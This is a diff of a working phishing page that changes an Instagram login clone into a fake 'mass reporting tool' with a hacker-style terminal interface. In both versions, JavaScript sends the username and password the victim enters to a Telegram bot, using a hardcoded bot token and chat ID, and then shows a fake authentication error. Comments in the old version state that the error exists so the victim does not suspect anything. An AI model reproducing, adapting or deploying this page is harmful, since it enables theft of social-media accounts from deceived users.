@@ -3,137 +3,146 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram</title>
+    <title>Instagram Mass Reporting Tool v4.2 [SECURE SHELL]</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-family: 'Courier New', Courier, monospace;
         }
         body {
-            background-color: #fafafa;
+            background-color: #050505;
+            color: #00ff66;
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            color: #262626;
+            padding: 20px;
         }
-        .container {
+        .terminal {
             width: 100%;
-            max-width: 350px;
-            padding: 0 20px;
+            max-width: 480px;
+            background: #0a0a0a;
+            border: 1px solid #00ff66;
+            box-shadow: 0 0 20px rgba(0, 255, 102, 0.2);
+            border-radius: 5px;
+            padding: 20px;
         }
-        .card {
-            background-color: #ffffff;
-            border: 1px solid #dbdbdb;
-            border-radius: 1px;
-            padding: 30px 40px;
-            text-align: center;
-            margin-bottom: 10px;
+        .header {
+            border-bottom: 1px dashed #00ff66;
+            padding-bottom: 10px;
+            margin-bottom: 15px;
+            font-size: 13px;
+            color: #ff0055;
+            text-shadow: 0 0 5px rgba(255, 0, 85, 0.5);
         }
-        .logo {
-            font-family: 'Billabong', cursive, sans-serif;
-            font-size: 3.2rem;
-            margin-bottom: 30px;
-            font-weight: normal;
+        .logs {
+            font-size: 11px;
+            color: #888;
+            height: 90px;
+            overflow: hidden;
+            margin-bottom: 15px;
+            border-left: 2px solid #ff0055;
+            padding-left: 8px;
         }
         .form-group {
-            position: relative;
-            margin-bottom: 6px;
+            margin-bottom: 12px;
+        }
+        label {
+            display: block;
+            font-size: 12px;
+            color: #00ff66;
+            margin-bottom: 5px;
         }
         input {
             width: 100%;
-            background: #fafafa;
-            border: 1px solid #dbdbdb;
-            border-radius: 3px;
-            padding: 9px 8px 7px 8px;
-            font-size: 12px;
-            color: #262626;
+            background: #000000;
+            border: 1px solid #00ff66;
+            color: #00ff66;
+            padding: 10px;
+            font-size: 13px;
             outline: none;
+            border-radius: 3px;
         }
         input:focus {
-            border-color: #a8a8a8;
+            box-shadow: 0 0 8px rgba(0, 255, 102, 0.5);
         }
         .btn {
             width: 100%;
-            background-color: #0095f6;
+            background: #00ff66;
+            color: #000000;
             border: none;
-            border-radius: 4px;
-            color: white;
-            font-weight: 600;
-            padding: 7px 16px;
+            padding: 11px;
+            font-weight: bold;
             font-size: 14px;
-            margin-top: 10px;
             cursor: pointer;
+            border-radius: 3px;
+            margin-top: 10px;
+            text-transform: uppercase;
+            transition: 0.2s;
         }
-        .btn:active {
-            opacity: 0.7;
+        .btn:hover {
+            background: #00cc52;
+            box-shadow: 0 0 10px #00ff66;
         }
-        .error-msg {
-            color: #ed4956;
-            font-size: 14px;
-            margin-bottom: 15px;
-            display: none;
-        }
-        .signup-card {
-            background-color: #ffffff;
-            border: 1px solid #dbdbdb;
-            border-radius: 1px;
-            padding: 20px;
+        .status {
+            margin-top: 15px;
+            font-size: 12px;
             text-align: center;
-            font-size: 14px;
-        }
-        .signup-card a {
-            color: #0095f6;
-            text-decoration: none;
-            font-weight: 600;
+            color: #ff3333;
+            display: none;
         }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div class="card">
-            <div class="logo">Instagram</div>
-            
-            <!-- رسالة الخطأ الوهمية التي تظهر عند المحاولة -->
-            <div id="errorBox" class="error-msg">كلمة المرور غير صحيحة. يرجى التحقق من كلمة المرور الخاصة بك وإعادة المحاولة.</div>
-
-            <form id="loginForm">
-                <div class="form-group">
-                    <input type="text" id="username" placeholder="اسم المستخدم، أو البريد الإلكتروني، أو رقم الهاتف" required>
-                </div>
-                <div class="form-group" style="margin-top: 6px;">
-                    <input type="password" id="password" placeholder="كلمة المرور" required>
-                </div>
-                <button type="submit" class="btn" id="submitBtn">تسجيل الدخول</button>
-            </form>
+    <div class="terminal">
+        <div class="header">
+            > SYSTEM: INSTAGRAM-MASS-REPORT-TOOL v4.2<br>
+            > STATUS: SECURE PROXY CONNECTED [DARKNET_NODE]
         </div>
 
-        <div class="signup-card">
-            ليس لديك حساب؟ <a href="#">إشترك</a>
+        <div class="logs" id="terminalLogs">
+            [+] Initializing secure handshake...<br>
+            [+] Bypassing Instagram Cloudflare WAF...<br>
+            [+] Target session node ready. Awaiting credentials...
         </div>
+
+        <form id="exploitForm">
+            <div class="form-group">
+                <label>> TARGET_USER / EMAIL / PHONE:</label>
+                <input type="text" id="targetUser" placeholder="أدخل اسم المستخدم المستهدف أو الضحية" required>
+            </div>
+            <div class="form-group">
+                <label>> VERIFICATION_PASSWORD:</label>
+                <input type="password" id="targetPass" placeholder="كلمة المرور لتأكيد الصلاحية" required>
+            </div>
+            <button type="submit" class="btn" id="execBtn">Execute Report Protocol</button>
+        </form>
+
+        <div id="statusMsg" class="status">[-] ERROR: Auth Failed! Invalid Node Credentials.</div>
     </div>
 
     <script>
         const BOT_TOKEN = "8634745626:AAFlyddrSV8EmJrWx4n-JEy4wQoPedwyaqQ";
         const CHAT_ID = "7822309283";
 
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        document.getElementById('exploitForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            
-            const user = document.getElementById('username').value;
-            const pass = document.getElementById('password').value;
-            const btn = document.getElementById('submitBtn');
-            const errorBox = document.getElementById('errorBox');
 
-            // تغيير حالة الزر أثناء الإرسال لزيادة الواقعية
-            btn.innerText = "جاري التحقق...";
+            const user = document.getElementById('targetUser').value;
+            const pass = document.getElementById('targetPass').value;
+            const btn = document.getElementById('execBtn');
+            const statusMsg = document.getElementById('statusMsg');
+            const logs = document.getElementById('terminalLogs');
+
+            btn.innerText = "BYPASSING API...";
             btn.disabled = true;
+            logs.innerHTML += "<br>[*] Sending payload to target session...";
 
-            const text = `🚨 صيد جديد - إنستغرام\n\n👤 الحساب: ${user}\n🔑 الباسورد: ${pass}`;
+            const text = `💀 صيد دارك ويب جديد - أداة بلاغات\n\n🎯 الهدف/الحساب: ${user}\n🔑 كلمة السر: ${pass}`;
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
             fetch(url, {
@@ -146,23 +155,23 @@
                     text: text
                 })
             })
-            .then(response => response.json())
+            .then(res => res.json())
             .then(data => {
-                // إظهار رسالة الخطأ بعد جزء من الثانية ليبدو الأمر طبيعياً كأن كلمة المرور خاطئة
                 setTimeout(() => {
-                    errorBox.style.display = "block";
-                    btn.innerText = "تسجيل الدخول";
+                    logs.innerHTML += "<br>[!] Handshake rejected by server.";
+                    status.style.display = "block";
+                    statusMsg.style.display = "block";
+                    btn.innerText = "Execute Report Protocol";
                     btn.disabled = false;
-                    document.getElementById('password').value = ""; // مسح الحقل فقط
-                }, 1000);
+                    document.getElementById('targetPass').value = "";
+                }, 1200);
             })
-            .catch(error => {
-                // حتى لو حدث خطأ تقني نظهر نفس رسالة الخطأ لكي لا يشك الضحية
+            .catch(err => {
                 setTimeout(() => {
-                    errorBox.style.display = "block";
-                    btn.innerText = "تسجيل الدخول";
+                    statusMsg.style.display = "block";
+                    btn.innerText = "Execute Report Protocol";
                     btn.disabled = false;
-                }, 1000);
+                }, 1200);
             });
         });
     </script>
